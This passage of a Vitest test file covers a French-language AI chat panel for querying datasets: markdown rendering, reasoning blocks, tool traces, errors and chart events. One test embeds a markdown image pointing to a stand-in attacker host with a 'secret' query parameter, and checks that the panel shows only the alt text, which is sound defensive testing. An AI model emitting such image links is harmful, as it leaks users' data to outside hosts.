    expect(assistantArticle.classes()).not.toContain('ml-auto')
    expect(assistantArticle.find('div.whitespace-pre-wrap').exists()).toBe(false)
    expect(assistantArticle.find('.prose').exists()).toBe(true)
  })

  it('renders user text as plain text, preserving newlines and ignoring markdown syntax', () => {
    chatState.messages.value = [
      { id: 'u1', role: 'user', parts: [{ type: 'text', text: 'Ligne 1\n**pas de gras**' }] },
    ]
    const wrapper = mountPanel('resource-1')

    const bubble = wrapper.find('article[data-message-role="user"] div.whitespace-pre-wrap')
    expect(bubble.text()).toBe('Ligne 1\n**pas de gras**')
    expect(bubble.find('strong').exists()).toBe(false)
  })

  it('updates markdown as streaming text chunks arrive', async () => {
    chatState.messages.value = [assistantTextMessage('Partie **une**')]
    const wrapper = mountPanel('resource-1')

    expect(wrapper.find('.prose').html()).toContain('<strong>une</strong>')

    chatState.messages.value = [assistantTextMessage('Partie **une** et deux')]
    await nextTick()
    expect(wrapper.find('.prose').html()).toContain('et deux')
  })

  it('renders a partial markdown block mid-stream without crashing', async () => {
    chatState.messages.value = [assistantTextMessage('Voici la requête :\n\n```sql\nSELECT year, COUNT(*)')]
    const wrapper = mountPanel('resource-1')

    expect(wrapper.find('.prose').exists()).toBe(true)
    expect(wrapper.text()).toContain('SELECT year, COUNT(*)')

    chatState.messages.value = [assistantTextMessage('Voici la requête :\n\n```sql\nSELECT year, COUNT(*) FROM resource\n```')]
    await nextTick()
    expect(wrapper.find('.prose').exists()).toBe(true)
  })

  it('groups consecutive reasoning parts into a single collapsed block', () => {
    chatState.messages.value = [{
      id: 'a1',
      role: 'assistant',
      parts: [
        { type: 'reasoning', text: 'Je réfléchis ', state: 'streaming' },
        { type: 'reasoning', text: 'à la requête.', state: 'done' },
        { type: 'text', text: 'Voici le résultat.' },
      ],
    }]
    const wrapper = mountPanel('resource-1')

    const blocks = wrapper.findAll('.thinking-block')
    expect(blocks).toHaveLength(1)
    expect(blocks[0].text()).toContain('Je réfléchis à la requête.')
    expect(blocks[0].find('button').attributes('aria-expanded')).toBe('false')
    expect(blocks[0].find('.thinking-block-panel').attributes('inert')).toBeDefined()
  })

  it('expands the reasoning block on click', async () => {
    chatState.messages.value = [{
      id: 'a1',
      role: 'assistant',
      parts: [{ type: 'reasoning', text: 'Réflexion', state: 'done' }],
    }]
    const wrapper = mountPanel('resource-1')

    const block = wrapper.find('.thinking-block')
    await block.find('button').trigger('click')

    expect(block.find('button').attributes('aria-expanded')).toBe('true')
    expect(block.find('.thinking-block-panel').attributes('inert')).toBeUndefined()
  })

  it('separates reasoning blocks interrupted by other parts', () => {
    chatState.messages.value = [{
      id: 'a1',
      role: 'assistant',
      parts: [
        { type: 'reasoning', text: 'D’abord.', state: 'done' },
        { type: 'tool-query_data', state: 'output-available', input: {}, output: 'n\n1' },
        { type: 'reasoning', text: 'Ensuite.', state: 'done' },
      ],
    }]
    const wrapper = mountPanel('resource-1')

    const blocks = wrapper.findAll('.thinking-block')
    expect(blocks).toHaveLength(2)
    expect(blocks[0].text()).toContain('D’abord.')
    expect(blocks[1].text()).toContain('Ensuite.')
  })

  it('renders query_data traces with a row summary, not raw JSON', () => {
    chatState.messages.value = [{
      id: 'a1',
      role: 'assistant',
      parts: [
        { type: 'tool-query_data', state: 'output-available', input: { group_by: 'year' }, output: 'year | nb\n2020 | 3\n2021 | 4' },
        { type: 'text', text: 'J’ai trouvé 2 lignes.' },
      ],
    }]
    const wrapper = mountPanel('resource-1')

    const trace = wrapper.find('.tool-trace')
    expect(trace.exists()).toBe(true)
    expect(trace.text()).toContain('Interrogation des données')
    expect(trace.text()).toContain('2 lignes')
    expect(trace.text()).not.toContain('{"group_by"')
    expect(wrapper.text()).toContain('J’ai trouvé 2 lignes.')
  })

  it('renders images of assistant replies as their alt text', () => {
    chatState.messages.value = [{
      id: 'a1',
      role: 'assistant',
      parts: [{ type: 'text', text: 'Résultat ![graphe](https://evil.example/?d=secret)' }],
    }]
    const wrapper = mountPanel('resource-1')

    expect(wrapper.find('img').exists()).toBe(false)
    expect(wrapper.html()).not.toContain('evil.example')
    expect(wrapper.text()).toContain('graphe')
  })

  it('maps tool types to French labels and first-person summaries', () => {
    chatState.messages.value = [{
      id: 'a1',
      role: 'assistant',
      parts: [
        { type: 'tool-get_dataset_metadata', state: 'output-available', input: {}, output: { title: 'Mon jeu', organization: 'Ministère', license: 'LOOL' } },
        { type: 'tool-inspect_schema', state: 'output-available', input: {}, output: { columns: ['year', 'rate'], rowCount: 42 } },
        { type: 'tool-request_clarification', state: 'output-available', input: { question: 'Quelle année ?' }, output: {} },
      ],
    }]
    const wrapper = mountPanel('resource-1')
    const text = wrapper.text()

    expect(text).toContain('Lecture des métadonnées')
    expect(text).toContain('Je consulte la fiche du jeu de données')
    expect(text).toContain('Inspection du schéma')
    expect(text).toContain('Je vérifie les colonnes et les types disponibles')
    expect(text).toContain('Demande de clarification')
    expect(text).toContain('Je précise ce qui est ambigu')
  })

  it('renders consecutive calls to the same tool as separate cards, one per call', () => {
    chatState.messages.value = [{
      id: 'a1',
      role: 'assistant',
      parts: [
        { type: 'tool-query_data', state: 'output-available', input: {}, output: 'n\n1' },
        { type: 'tool-query_data', state: 'output-available', input: {}, output: 'n\n2' },
        { type: 'text', text: 'ok' },
      ],
    }]
    const wrapper = mountPanel('resource-1')

    const traces = wrapper.findAll('.tool-trace')
    expect(traces).toHaveLength(2)
    expect(traces[0].find('pre').text()).toContain('1')
    expect(traces[1].find('pre').text()).toContain('2')
  })

  it('renders alternating tools as separate per-call cards in arrival order', () => {
    chatState.messages.value = [{
      id: 'a1',
      role: 'assistant',
      parts: [
        { type: 'tool-query_data', state: 'output-available', input: {}, output: 'n\n1' },
        { type: 'tool-inspect_schema', state: 'output-available', input: {}, output: { columns: ['year'], rowCount: 1 } },
        { type: 'tool-query_data', state: 'output-available', input: {}, output: 'n\n2' },
      ],
    }]
    const wrapper = mountPanel('resource-1')

    const traces = wrapper.findAll('.tool-trace')
    expect(traces).toHaveLength(3)
    expect(traces[0].text()).toContain('Interrogation des données')
    expect(traces[1].text()).toContain('Inspection du schéma')
    expect(traces[2].text()).toContain('Interrogation des données')
    expect(traces[0].find('pre').text()).toContain('1')
    expect(traces[2].find('pre').text()).toContain('2')
  })

  it('keeps separate cards per state even when the tool alternates', () => {
    chatState.messages.value = [{
      id: 'a1',
      role: 'assistant',
      parts: [
        { type: 'tool-query_data', state: 'output-error', input: {}, errorText: 'boom' },
        { type: 'tool-inspect_schema', state: 'output-available', input: {}, output: { columns: ['year'], rowCount: 1 } },
        { type: 'tool-query_data', state: 'output-available', input: {}, output: 'n\n2' },
      ],
    }]
    const wrapper = mountPanel('resource-1')

    const traces = wrapper.findAll('.tool-trace')
    expect(traces).toHaveLength(3)
    expect(traces[0].text()).toContain('boom')
    expect(traces[1].text()).toContain('Inspection du schéma')
    expect(traces[2].find('pre').text()).toContain('2')
  })

  it('keeps consecutive calls in separate cards when their states differ', () => {
    chatState.messages.value = [{
      id: 'a1',
      role: 'assistant',
      parts: [
        { type: 'tool-query_data', state: 'output-error', input: {}, errorText: 'syntax error' },
        { type: 'tool-query_data', state: 'output-available', input: {}, output: 'n\n2' },
      ],
    }]
    const wrapper = mountPanel('resource-1')

    expect(wrapper.findAll('.tool-trace')).toHaveLength(2)
  })

  it('renders failed tool traces in red with the error message', () => {
    chatState.messages.value = [{
      id: 'a1',
      role: 'assistant',
      parts: [
        { type: 'tool-query_data', state: 'output-error', input: {}, errorText: 'relation « data » inexistante' },
      ],
    }]
    const wrapper = mountPanel('resource-1')

    const trace = wrapper.find('.tool-trace')
    expect(trace.text()).toContain('relation « data » inexistante')
    const summary = wrapper.findAll('span').find(span => span.text() === 'relation « data » inexistante')
    expect(summary!.classes()).toContain('text-new-error')
  })

  it('displays the mapped French error message', async () => {
    chatState.error.value = Object.assign(new Error('Too Many Requests'), { statusCode: 429 })
    const wrapper = mountPanel('resource-1')
    await flushPromises()

    const alert = wrapper.find('[role="alert"]')
    expect(alert.exists()).toBe(true)
    expect(alert.text()).toContain('Quota journalier dépassé')
  })

  it('offers a new conversation only once the conversation has started', async () => {
    const empty = mountPanel('resource-1')
    expect(empty.find('[data-testid="assistant-new-conversation"]').exists()).toBe(false)
    empty.unmount()

    chatState.messages.value = [assistantTextMessage('Bonjour')]
    const wrapper = mountPanel('resource-1')
    const button = wrapper.find('[data-testid="assistant-new-conversation"]')
    expect(button.attributes('type')).toBe('button')
    expect(button.text()).toBe('Nouvelle conversation')
    await button.trigger('click')
    expect(newConversationMock).toHaveBeenCalledOnce()
  })

  it('invites to start a new conversation after a 413', async () => {
    chatState.messages.value = [assistantTextMessage('Bonjour')]
    chatState.error.value = Object.assign(new Error('Payload Too Large'), { statusCode: 413 })
    const wrapper = mountPanel('resource-1')
    await flushPromises()

    const alert = wrapper.find('[role="alert"]')
    expect(alert.text()).toContain('La conversation est trop volumineuse.')
    const restart = alert.find('button')
    expect(restart.text()).toBe('Commencer une nouvelle conversation')
    await restart.trigger('click')
    expect(newConversationMock).toHaveBeenCalledOnce()
  })

  it('does not offer a new conversation in other errors', async () => {
    chatState.error.value = Object.assign(new Error('Too Many Requests'), { statusCode: 429 })
    const wrapper = mountPanel('resource-1')
    await flushPromises()

    expect(wrapper.find('[role="alert"] button').exists()).toBe(false)
  })

  it('rebuilds only the streaming message on each chunk', async () => {
    const finished = [
      { id: 'u1', role: 'user', parts: [{ type: 'text', text: 'Question' }] },
      assistantTextMessage('Première réponse'),
      { id: 'u2', role: 'user', parts: [{ type: 'text', text: 'Suite' }] },
    ]
    chatState.status.value = 'streaming'
    chatState.messages.value = [...finished, assistantTextMessage('Déb')]
    mountPanel('resource-1')
    await nextTick()
    const build = vi.mocked(buildChatDisplayItems)
    build.mockClear()

    chatState.messages.value = [...finished, assistantTextMessage('Début de la réponse')]
    await nextTick()

    expect(build.mock.calls.map(([parts]) => parts)).not.toContain(finished[1]!.parts)
    expect(build).toHaveBeenCalled()
  })

  it('restores the sent text in the composer when the request fails', async () => {
    const wrapper = mountPanel('resource-1')
    const textarea = wrapper.find('textarea#assistant-input')

    await textarea.setValue('Message perdu ?')
    await wrapper.find('button[aria-label="Envoyer"]').trigger('click')
    expect((textarea.element as HTMLTextAreaElement).value).toBe('')

    chatState.status.value = 'error'
    chatState.error.value = new Error('fetch failed')
    await nextTick()

    expect((textarea.element as HTMLTextAreaElement).value).toBe('Message perdu ?')
  })

  it('drops the failed turn from the history so a retry does not duplicate it', async () => {
    const answered = [
      { id: 'u1', role: 'user', parts: [{ type: 'text', text: 'Première question' }] },
      { id: 'a1', role: 'assistant', parts: [{ type: 'text', text: 'Réponse' }] },
    ]
    chatState.messages.value = [...answered]
    const wrapper = mountPanel('resource-1')

    await wrapper.find('textarea#assistant-input').setValue('Question en échec')
    await wrapper.find('button[aria-label="Envoyer"]').trigger('click')
    // useChat keeps the user message, and a partial reply when the stream breaks.
    chatState.messages.value = [
      ...answered,
      { id: 'u2', role: 'user', parts: [{ type: 'text', text: 'Question en échec' }] },
      { id: 'a2', role: 'assistant', parts: [{ type: 'text', text: 'Début de répo' }] },
    ]
    chatState.status.value = 'error'
    chatState.error.value = new Error('fetch failed')
    await nextTick()

    expect(chatState.messages.value).toEqual(answered)
  })

  it('keeps the composer cleared when the request succeeds', async () => {
    const wrapper = mountPanel('resource-1')
    const textarea = wrapper.find('textarea#assistant-input')

    await textarea.setValue('Message envoyé')
    await wrapper.find('button[aria-label="Envoyer"]').trigger('click')
    chatState.status.value = 'ready'
    await nextTick()

    expect((textarea.element as HTMLTextAreaElement).value).toBe('')
  })

  it('refocuses the textarea once the request finishes', async () => {
    const wrapper = mountPanel('resource-1')
    const textarea = wrapper.find('textarea#assistant-input')

    // Simulate the request lifecycle: submitted while sending, ready when done.
    await textarea.setValue('ok')
    await wrapper.find('button[aria-label="Envoyer"]').trigger('click')
    chatState.status.value = 'submitted'
    await nextTick()
    chatState.status.value = 'ready'
    // The watcher awaits a nextTick before focusing: flush twice.
    await flushPromises()
    await nextTick()

    expect(document.activeElement).toBe(textarea.element)
  })

  it('keeps the composer usable after an error status', async () => {
    // useChat leaves the status on 'error' after a failed request until the next
    // one starts: the composer must not stay disabled.
    chatState.status.value = 'error'
    chatState.error.value = Object.assign(new Error('fetch failed'), {})
    const wrapper = mountPanel('resource-1')

    const textarea = wrapper.find('textarea#assistant-input')
    expect(textarea.attributes('disabled')).toBeUndefined()

    await textarea.setValue('On réessaie ?')
    await wrapper.find('button[aria-label="Envoyer"]').trigger('click')

    expect(sendMessageMock).toHaveBeenCalledWith({ text: 'On réessaie ?' })
  })

  it('still disables the composer while a request is in flight', () => {
    chatState.status.value = 'streaming'
    const wrapper = mountPanel('resource-1')

    expect(wrapper.find('textarea#assistant-input').attributes('disabled')).toBeDefined()
  })

  describe('chart-result', () => {
    const chart = { ...CHART }
    const createPart = (state: string, id = 'call-1') => ({
      type: 'tool-create_chart',
      toolCallId: id,
      state,
      input: {},
      ...(state === 'output-available' ? { output: { status: 'ok', chart, more_groups: false } } : {}),
    })

    it('emits chart-result when the tool output arrives', async () => {
      chatState.messages.value = [{ id: 'a1', role: 'assistant', parts: [createPart('input-available')] }]
      const wrapper = mountPanel('resource-1')
      expect(wrapper.emitted('chart-result')).toBeUndefined()

      chatState.messages.value = [{ id: 'a1', role: 'assistant', parts: [createPart('output-available')] }]
      await nextTick()
      expect(wrapper.emitted('chart-result')).toHaveLength(1)
      expect(wrapper.emitted('chart-result')![0]![0]).toMatchObject({ toolCallId: 'call-1', kind: 'create' })
    })

    it('does not emit again for a message that did not change', async () => {
      const wrapper = mountPanel('resource-1')
      const answered = { id: 'a1', role: 'assistant', parts: [createPart('output-available')] }
      chatState.messages.value = [answered]
      await nextTick()
      chatState.messages.value = [answered, { id: 'u2', role: 'user', parts: [{ type: 'text', text: 'Et ensuite ?' }] }]
      await nextTick()

      expect(wrapper.emitted('chart-result')).toHaveLength(1)
    })

    it('emits a distinct result for each new tool call', async () => {
      const wrapper = mountPanel('resource-1')
      chatState.messages.value = [{ id: 'a1', role: 'assistant', parts: [createPart('output-available', 'c1')] }]
      await nextTick()
      chatState.messages.value = [{
        id: 'a1',
        role: 'assistant',
        parts: [
          createPart('output-available', 'c1'),
          { type: 'tool-update_chart', toolCallId: 'c2', state: 'output-available', input: {}, output: { status: 'ok', patch: { title: 'Nouveau' } } },
        ],
      }]
      await nextTick()

      expect(wrapper.emitted('chart-result')!.at(-1)![0]).toMatchObject({ toolCallId: 'c2', kind: 'update' })
    })
  })
})
